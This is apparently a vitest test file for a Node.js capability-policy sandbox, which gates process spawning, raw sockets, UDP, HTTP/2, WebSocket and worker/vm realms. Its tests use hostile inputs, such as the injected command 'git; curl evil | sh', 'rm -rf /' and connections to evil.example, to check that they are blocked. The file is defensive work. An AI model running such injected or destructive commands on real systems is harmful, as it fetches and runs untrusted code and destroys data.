import { createRequire } from "node:module";
import { afterEach, describe, expect, test, vi } from "vitest";
import { CapabilityPolicy } from "./capability-policy";
import {
    defaultShellProgram,
    defineEnforcedGlobal,
    type EnforcementEnv,
    installBuiltinModuleEnforcement,
    netTargetFromConnectArgs,
    netTargetFromDgramConnect,
    netTargetFromDgramSend,
    programFromArg,
    programFromExecArgs,
    programFromSpawnFamilyArgs,
    programFromSpawnOptions,
    RealmPolicyError,
    shellFromOptions,
} from "./enforced-builtins";
import { NetworkPolicyError } from "./enforced-net";
import { ProcessPolicyError } from "./enforced-process";

const nodeRequire = createRequire(import.meta.url);

/**
 * A real `require` that is deliberately *blind* to the realm/global builtins
 * (`node:vm` / `node:worker_threads` / `node:dgram` / `node:http2`), paired with
 * a throwaway `globalTarget`. This lets the `net`/`process` tests below install
 * the real `node:net` / `node:child_process` patches they assert on without
 * clobbering the shared test worker's real `node:vm` / global `WebSocket` /
 * `Worker` (which would leak across test files). The realm/egress patches get
 * their own dedicated coverage on explicit fakes further down.
 */
function scopedEnv(): EnforcementEnv {
    const blind = new Set([
        "node:vm",
        "node:worker_threads",
        "node:dgram",
        "node:http2",
    ]);
    const scoped = ((id: string) =>
        blind.has(id) ? {} : nodeRequire(id)) as unknown as NodeJS.Require;
    return { nodeRequire: scoped, globalTarget: {} };
}

/**
 * Build the layered `--enforce` JSON the Rust `ShimPolicy` emits from a single
 * policy level. `enforced` is derived from the domains the layer names.
 */
function enforceJson(
    layer: Record<string, { allow?: string[]; deny?: string[] }>,
): string {
    return JSON.stringify({ enforced: Object.keys(layer), layers: [layer] });
}

describe("netTargetFromConnectArgs", () => {
    test("(port, host) form", () => {
        expect(netTargetFromConnectArgs([443, "example.com"])).toEqual({
            host: "example.com",
            port: 443,
        });
    });

    test("(port) form defaults the host to localhost", () => {
        expect(netTargetFromConnectArgs([8080])).toEqual({
            host: "localhost",
            port: 8080,
        });
    });

    test("options object with port and host", () => {
        expect(
            netTargetFromConnectArgs([{ port: 5432, host: "db.internal" }]),
        ).toEqual({ host: "db.internal", port: 5432 });
    });

    test("unwraps the normalized [options, callback] array net.connect produces", () => {
        // net.connect(443, "example.com") reaches Socket.prototype.connect as a
        // single [{ port, host }, cb] array.
        expect(
            netTargetFromConnectArgs([
                [{ port: 443, host: "example.com" }, null],
            ]),
        ).toEqual({ host: "example.com", port: 443 });
        expect(
            netTargetFromConnectArgs([[{ path: "/tmp/x.sock" }, null]]),
        ).toBeNull();
    });

    test("IPC forms (string path / { path }) yield null", () => {
        expect(netTargetFromConnectArgs(["/tmp/app.sock"])).toBeNull();
        expect(
            netTargetFromConnectArgs([{ path: "/tmp/app.sock" }]),
        ).toBeNull();
    });

    test("indeterminate forms yield null (fall through to the floor)", () => {
        expect(netTargetFromConnectArgs([])).toBeNull();
        expect(
            netTargetFromConnectArgs([{ host: "no-port.example" }]),
        ).toBeNull();
    });
});

describe("program extraction (shell-as-program model)", () => {
    test("a direct executable is authorized as itself", () => {
        expect(programFromArg("git")).toBe("git");
        expect(programFromArg("")).toBeNull();
        expect(programFromArg(123)).toBeNull();
    });

    test("shellFromOptions surfaces the requested shell binary", () => {
        const sh = defaultShellProgram();
        // `{ shell: true }` → the platform default shell.
        expect(shellFromOptions(["git status", { shell: true }])).toBe(sh);
        // An explicit string override wins.
        expect(shellFromOptions(["git status", { shell: "/bin/bash" }])).toBe(
            "/bin/bash",
        );
        // No shell requested → a direct spawn.
        expect(shellFromOptions(["git", { cwd: "/tmp" }])).toBeNull();
        expect(shellFromOptions(["git"])).toBeNull();
    });

    test("the spawn family authorizes the shell for a shell invocation, else the executable", () => {
        // A shell spawn resolves to the shell binary, NOT the first token of
        // the (injectable) command line.
        expect(
            programFromSpawnFamilyArgs(["git; curl evil", { shell: true }]),
        ).toBe(defaultShellProgram());
        // A direct spawn resolves to its executable.
        expect(programFromSpawnFamilyArgs(["git", ["status"]])).toBe("git");
    });

    test("exec/execSync always authorize the shell, never the command line", () => {
        // The whole point of #4: the shell runs an arbitrary command line, so
        // the authorized program is the shell — injecting `; curl` cannot
        // launder authority through a benign-looking first token.
        expect(programFromExecArgs(["git status"])).toBe(defaultShellProgram());
        expect(programFromExecArgs(["git; curl evil | sh"])).toBe(
            defaultShellProgram(),
        );
        expect(
            programFromExecArgs(["git status", { shell: "/bin/bash" }]),
        ).toBe("/bin/bash");
        // No command line → nothing to authorize.
        expect(programFromExecArgs([""])).toBeNull();
        expect(programFromExecArgs([42])).toBeNull();
    });
});

describe("programFromSpawnOptions (ChildProcess.prototype.spawn payload)", () => {
    test("a direct spawn resolves to its executable", () => {
        expect(
            programFromSpawnOptions({ file: "git", args: ["git", "status"] }),
        ).toBe("git");
    });

    test("a shell invocation resolves to the shell binary the runtime resolved", () => {
        // The runtime has already resolved `file` to the shell itself, so we
        // authorize the shell — not the inner command line's first token.
        expect(
            programFromSpawnOptions({
                file: "/bin/sh",
                args: ["/bin/sh", "-c", "rm -rf /tmp"],
                shell: true,
            }),
        ).toBe("/bin/sh");
    });

    test("indeterminate payloads yield null", () => {
        expect(programFromSpawnOptions(undefined)).toBeNull();
        expect(programFromSpawnOptions({})).toBeNull();
        expect(programFromSpawnOptions({ shell: true, args: [] })).toBeNull();
    });
});

describe("installBuiltinModuleEnforcement — node:child_process", () => {
    const cp = nodeRequire("node:child_process") as Record<string, unknown>;
    const originals = new Map<string, unknown>();

    afterEach(() => {
        for (const [key, value] of originals) {
            cp[key] = value;
        }
        originals.clear();
    });

    function stub(key: string) {
        originals.set(key, cp[key]);
        const spy = vi.fn(() => "spawned");
        cp[key] = spy;
        return spy;
    }

    test("denies a spawn of a program outside the allow-list", () => {
        const spawn = stub("spawn");
        const policy = CapabilityPolicy.parse(
            enforceJson({ process: { allow: ["git"] } }),
        );
        installBuiltinModuleEnforcement(policy, scopedEnv());

        expect(() => (cp.spawn as (...a: unknown[]) => unknown)("rm")).toThrow(
            ProcessPolicyError,
        );
        expect(spawn).not.toHaveBeenCalled();
    });

    test("permits an allowed program and delegates to the real binding", () => {
        const spawn = stub("spawn");
        const policy = CapabilityPolicy.parse(
            enforceJson({ process: { allow: ["git"] } }),
        );
        installBuiltinModuleEnforcement(policy, scopedEnv());

        expect(
            (cp.spawn as (...a: unknown[]) => unknown)("git", ["status"]),
        ).toBe("spawned");
        expect(spawn).toHaveBeenCalledOnce();
    });

    test("exec authorizes the shell (not the command line's first token)", () => {
        const exec = stub("exec");
        // The `process` policy grants only the shell binary, not `git`.
        const policy = CapabilityPolicy.parse(
            enforceJson({
                process: { allow: [defaultShellProgram()] },
            }),
        );
        installBuiltinModuleEnforcement(policy, scopedEnv());

        // A benign-looking first token cannot smuggle an injected command past
        // the check: `exec` authorizes the shell, which the policy grants here.
        (cp.exec as (...a: unknown[]) => unknown)("git; curl evil | sh");
        expect(exec).toHaveBeenCalledOnce();
    });

    test("exec is denied when the policy does not grant the shell", () => {
        const exec = stub("exec");
        // Granting `git` no longer implies the right to run a shell: `exec`
        // always spawns the shell, so a shell grant is required.
        const policy = CapabilityPolicy.parse(
            enforceJson({ process: { allow: ["git"] } }),
        );
        installBuiltinModuleEnforcement(policy, scopedEnv());

        expect(() =>
            (cp.exec as (...a: unknown[]) => unknown)("git status"),
        ).toThrow(ProcessPolicyError);
        expect(exec).not.toHaveBeenCalled();
    });

    test("leaves child_process untouched when process is not enforced", () => {
        const spawn = stub("spawn");
        installBuiltinModuleEnforcement(CapabilityPolicy.empty(), scopedEnv());
        // Not wrapped → the raw stub is called with no policy check.
        (cp.spawn as (...a: unknown[]) => unknown)("anything");
        expect(spawn).toHaveBeenCalledOnce();
    });
});

describe("installBuiltinModuleEnforcement — ChildProcess.prototype.spawn", () => {
    const cpProto = nodeRequire("node:child_process") as {
        ChildProcess: { prototype: Record<string, unknown> };
    };
    let original: unknown;

    afterEach(() => {
        if (original !== undefined) {
            cpProto.ChildProcess.prototype.spawn = original as never;
            original = undefined;
        }
    });

    function stubProtoSpawn() {
        original = cpProto.ChildProcess.prototype.spawn;
        const spy = vi.fn(function (this: unknown) {
            return this;
        });
        cpProto.ChildProcess.prototype.spawn = spy as never;
        return spy;
    }

    test("denies a direct spawn of a program outside the allow-list", () => {
        const protoSpawn = stubProtoSpawn();
        const policy = CapabilityPolicy.parse(
            enforceJson({ process: { allow: ["git"] } }),
        );
        installBuiltinModuleEnforcement(policy, scopedEnv());

        const child = Object.create(cpProto.ChildProcess.prototype) as {
            spawn: (...a: unknown[]) => unknown;
        };
        expect(() =>
            child.spawn({ file: "rm", args: ["rm", "-rf", "/"] }),
        ).toThrow(ProcessPolicyError);
        expect(protoSpawn).not.toHaveBeenCalled();

        child.spawn({ file: "git", args: ["git", "status"] });
        expect(protoSpawn).toHaveBeenCalledOnce();
    });

    test("authorizes the shell binary of a shell invocation, not the inner command", () => {
        const protoSpawn = stubProtoSpawn();
        // Granting only `git` must NOT authorize a shell that could run `git`
        // plus anything else; the shell binary itself is the program.
        const gitOnly = CapabilityPolicy.parse(
            enforceJson({ process: { allow: ["git"] } }),
        );
        installBuiltinModuleEnforcement(gitOnly, scopedEnv());

        const child = Object.create(cpProto.ChildProcess.prototype) as {
            spawn: (...a: unknown[]) => unknown;
        };
        expect(() =>
            child.spawn({
                file: "/bin/sh",
                args: ["/bin/sh", "-c", "git status"],
                shell: true,
            }),
        ).toThrow(ProcessPolicyError);
        expect(protoSpawn).not.toHaveBeenCalled();
    });

    test("permits a shell invocation when the policy grants the shell", () => {
        const protoSpawn = stubProtoSpawn();
        const shellAllowed = CapabilityPolicy.parse(
            enforceJson({ process: { allow: ["/bin/sh"] } }),
        );
        installBuiltinModuleEnforcement(shellAllowed, scopedEnv());

        const child = Object.create(cpProto.ChildProcess.prototype) as {
            spawn: (...a: unknown[]) => unknown;
        };
        // Even an injected command line is within policy once the shell is
        // explicitly granted — the grant honestly means "may run a shell".
        child.spawn({
            file: "/bin/sh",
            args: ["/bin/sh", "-c", "git; curl evil | sh"],
            shell: true,
        });
        expect(protoSpawn).toHaveBeenCalledOnce();
    });
});

describe("installBuiltinModuleEnforcement — node:net", () => {
    const net = nodeRequire("node:net") as {
        Socket: { prototype: Record<string, unknown> };
    };
    let original: unknown;

    afterEach(() => {
        if (original !== undefined) {
            net.Socket.prototype.connect = original as never;
            original = undefined;
        }
    });

    function stubConnect() {
        original = net.Socket.prototype.connect;
        const spy = vi.fn(function (this: unknown) {
            return this;
        });
        net.Socket.prototype.connect = spy as never;
        return spy;
    }

    test("denies a raw socket to a host outside the allow-list", () => {
        const connect = stubConnect();
        const policy = CapabilityPolicy.parse(
            enforceJson({ net: { allow: ["example.com:443"] } }),
        );
        installBuiltinModuleEnforcement(policy, scopedEnv());

        const socket = Object.create(net.Socket.prototype) as {
            connect: (...a: unknown[]) => unknown;
        };
        expect(() => socket.connect(443, "evil.example")).toThrow(
            NetworkPolicyError,
        );
        expect(connect).not.toHaveBeenCalled();

        socket.connect(443, "example.com");
        expect(connect).toHaveBeenCalledOnce();
    });
});

describe("dgram target extraction", () => {
    test("send(msg, port, address) resolves the datagram target", () => {
        expect(netTargetFromDgramSend(["hi", 5000, "host.example"])).toEqual({
            host: "host.example",
            port: 5000,
        });
    });

    test("send(msg, offset, length, port, address) skips offset/length", () => {
        // The 6-arg form's leading numbers are offset+length, not the port.
        expect(
            netTargetFromDgramSend(["payload", 0, 7, 8125, "metrics.internal"]),
        ).toEqual({ host: "metrics.internal", port: 8125 });
    });

    test("send with an omitted address defaults the host", () => {
        expect(netTargetFromDgramSend(["hi", 5000])).toEqual({
            host: "localhost",
            port: 5000,
        });
    });

    test("send on a connected socket (no target) yields null", () => {
        // `send(msg, cb)` — the prior connect was already authorized.
        expect(netTargetFromDgramSend(["hi", () => {}])).toBeNull();
        expect(netTargetFromDgramSend(["hi"])).toBeNull();
    });

    test("connect(port, address) resolves the pinned target", () => {
        expect(netTargetFromDgramConnect([9000, "udp.example"])).toEqual({
            host: "udp.example",
            port: 9000,
        });
        expect(netTargetFromDgramConnect([9000])).toEqual({
            host: "localhost",
            port: 9000,
        });
        expect(netTargetFromDgramConnect([])).toBeNull();
    });
});

describe("installBuiltinModuleEnforcement — non-TCP / non-fetch egress", () => {
    // A fake `require` that hands back patchable stubs for the *critical*
    // chokepoints (so their loud "could not patch" warning stays quiet) and the
    // caller's overrides for the module under test.
    function egressRequire(mods: Record<string, unknown>): NodeJS.Require {
        const base: Record<string, unknown> = {
            "node:net": { Socket: { prototype: { connect() {} } } },
            "node:child_process": {
                spawn() {},
                ChildProcess: { prototype: { spawn() {} } },
            },
            "node:tls": { connect() {} },
            "node:module": {},
        };
        return ((id: string) =>
            id in mods
                ? mods[id]
                : (base[id] ?? {})) as unknown as NodeJS.Require;
    }

    test("gates node:dgram UDP send against the net policy", () => {
        const send = vi.fn(function (this: unknown) {
            return this;
        });
        const proto: Record<string, unknown> = { send };
        const policy = CapabilityPolicy.parse(
            enforceJson({ net: { allow: ["metrics.internal:8125"] } }),
        );
        installBuiltinModuleEnforcement(policy, {
            nodeRequire: egressRequire({
                "node:dgram": { Socket: { prototype: proto } },
            }),
            globalTarget: {},
        });

        const patched = proto.send as (...a: unknown[]) => unknown;
        expect(() => patched.call(proto, "x", 8125, "evil.example")).toThrow(
            NetworkPolicyError,
        );
        expect(send).not.toHaveBeenCalled();
        patched.call(proto, "x", 8125, "metrics.internal");
        expect(send).toHaveBeenCalledOnce();
    });

    test("gates node:http2 connect against the net policy", () => {
        const connect = vi.fn(() => "session");
        const http2: Record<string, unknown> = { connect };
        const policy = CapabilityPolicy.parse(
            enforceJson({ net: { allow: ["api.example:443"] } }),
        );
        installBuiltinModuleEnforcement(policy, {
            nodeRequire: egressRequire({ "node:http2": http2 }),
            globalTarget: {},
        });

        const patched = http2.connect as (...a: unknown[]) => unknown;
        expect(() => patched("https://evil.example")).toThrow(
            NetworkPolicyError,
        );
        expect(connect).not.toHaveBeenCalled();
        patched("https://api.example");
        expect(connect).toHaveBeenCalledOnce();
    });

    test("gates the global WebSocket constructor against the net policy", () => {
        const constructed: unknown[] = [];
        class FakeWebSocket {
            constructor(public url: string) {
                constructed.push(url);
            }
            static readonly OPEN = 1;
        }
        const globalTarget: Record<string, unknown> = {
            WebSocket: FakeWebSocket,
        };
        const policy = CapabilityPolicy.parse(
            enforceJson({ net: { allow: ["realtime.example:443"] } }),
        );
        installBuiltinModuleEnforcement(policy, {
            nodeRequire: egressRequire({}),
            globalTarget,
        });

        const Patched = globalTarget.WebSocket as new (u: string) => unknown;
        // The Proxy preserves statics and the raw constructor is only reached
        // once the target is authorized.
        expect((Patched as unknown as { OPEN: number }).OPEN).toBe(1);
        expect(() => new Patched("wss://evil.example")).toThrow(
            NetworkPolicyError,
        );
        expect(constructed).toHaveLength(0);
        const ok = new Patched("wss://realtime.example");
        expect(ok).toBeInstanceOf(FakeWebSocket);
        expect(constructed).toEqual(["wss://realtime.example"]);

        // The slot is locked non-writable and non-configurable so untrusted
        // code cannot reassign or `delete`/redefine it back to the raw
        // constructor, and a repeat install is an idempotent no-op (no throw,
        // wrapper preserved) rather than relying on the slot staying redefinable.
        const descriptor = Object.getOwnPropertyDescriptor(
            globalTarget,
            "WebSocket",
        );
        expect(descriptor?.writable).toBe(false);
        expect(descriptor?.configurable).toBe(false);
        expect(() =>
            installBuiltinModuleEnforcement(policy, {
                nodeRequire: egressRequire({}),
                globalTarget,
            }),
        ).not.toThrow();
        expect(globalTarget.WebSocket).toBe(Patched);
    });
});

describe("installBuiltinModuleEnforcement — fresh-realm gating", () => {
    function realmRequire(mods: Record<string, unknown>): NodeJS.Require {
        const base: Record<string, unknown> = {
            "node:net": { Socket: { prototype: { connect() {} } } },
            "node:child_process": {
                spawn() {},
                ChildProcess: { prototype: { spawn() {} } },
            },
            "node:tls": { connect() {} },
            "node:module": {},
        };
        return ((id: string) =>
            id in mods
                ? mods[id]
                : (base[id] ?? {})) as unknown as NodeJS.Require;
    }

    test("blocks node:worker_threads Worker while net/process is enforced", () => {
        class FakeWorker {}
        const wt: Record<string, unknown> = { Worker: FakeWorker };
        const policy = CapabilityPolicy.parse(
            enforceJson({ process: { allow: ["git"] } }),
        );
        installBuiltinModuleEnforcement(policy, {
            nodeRequire: realmRequire({ "node:worker_threads": wt }),
            globalTarget: {},
        });

        expect(() => (wt.Worker as new () => unknown).call(undefined)).toThrow(
            RealmPolicyError,
        );
    });

    test("blocks the global Worker while net/process is enforced", () => {
        const globalTarget: Record<string, unknown> = { Worker: class {} };
        const policy = CapabilityPolicy.parse(
            enforceJson({ net: { allow: ["h:1"] } }),
        );
        installBuiltinModuleEnforcement(policy, {
            nodeRequire: realmRequire({}),
            globalTarget,
        });

        expect(() => (globalTarget.Worker as () => unknown)()).toThrow(
            RealmPolicyError,
        );

        // Locked non-writable/non-configurable, and a repeat install is an
        // idempotent no-op rather than a throwing redefinition.
        const blocked = globalTarget.Worker;
        const descriptor = Object.getOwnPropertyDescriptor(
            globalTarget,
            "Worker",
        );
        expect(descriptor?.writable).toBe(false);
        expect(descriptor?.configurable).toBe(false);
        expect(() =>
            installBuiltinModuleEnforcement(policy, {
                nodeRequire: realmRequire({}),
                globalTarget,
            }),
        ).not.toThrow();
        expect(globalTarget.Worker).toBe(blocked);
    });

    test("blocks node:vm new-context execution but leaves runInThisContext", () => {
        const runInThisContext = vi.fn(() => "ok");
        const vm: Record<string, unknown> = {
            runInNewContext: vi.fn(),
            runInContext: vi.fn(),
            createContext: vi.fn(),
            compileFunction: vi.fn(),
            SourceTextModule: class {},
            runInThisContext,
        };
        const policy = CapabilityPolicy.parse(
            enforceJson({ process: { allow: ["git"] } }),
        );
        installBuiltinModuleEnforcement(policy, {
            nodeRequire: realmRequire({ "node:vm": vm }),
            globalTarget: {},
        });

        for (const key of [
            "runInNewContext",
            "runInContext",
            "createContext",
            "compileFunction",
            "SourceTextModule",
        ]) {
            expect(() => (vm[key] as () => unknown)()).toThrow(
                RealmPolicyError,
            );
        }
        // Same-realm execution stays intact (it grants no new authority).
        expect((vm.runInThisContext as () => unknown)()).toBe("ok");
    });

    test("leaves realms alone when neither net nor process is enforced", () => {
        const wt: Record<string, unknown> = { Worker: vi.fn(() => "worker") };
        installBuiltinModuleEnforcement(CapabilityPolicy.empty(), {
            nodeRequire: realmRequire({ "node:worker_threads": wt }),
            globalTarget: {},
        });
        // Untouched: an env-only or empty policy does not gate fresh realms.
        expect((wt.Worker as () => unknown)()).toBe("worker");
    });
});

describe("defineEnforcedGlobal", () => {
    test("locks the slot non-writable and non-configurable", () => {
        const target: Record<string, unknown> = { g: () => "raw" };
        const patched = () => "patched";
        expect(defineEnforcedGlobal(target, "g", patched)).toBe(true);
        expect(target.g).toBe(patched);

        const descriptor = Object.getOwnPropertyDescriptor(target, "g");
        expect(descriptor?.writable).toBe(false);
        expect(descriptor?.configurable).toBe(false);
        // Neither reassignment nor deletion can recover the raw value.
        expect(() => {
            (target as { g: unknown }).g = () => "evil";
        }).toThrow();
        expect(() => delete target.g).toThrow();
        expect(target.g).toBe(patched);
    });

    test("a repeat install is an idempotent no-op, not a throwing redefine", () => {
        const target: Record<string, unknown> = { g: () => "raw" };
        const first = () => "first";
        defineEnforcedGlobal(target, "g", first);
        // A second call with a fresh value must not throw against the now
        // non-configurable slot; the marker keeps the first lock in place.
        expect(defineEnforcedGlobal(target, "g", () => "second")).toBe(true);
        expect(target.g).toBe(first);
    });
});
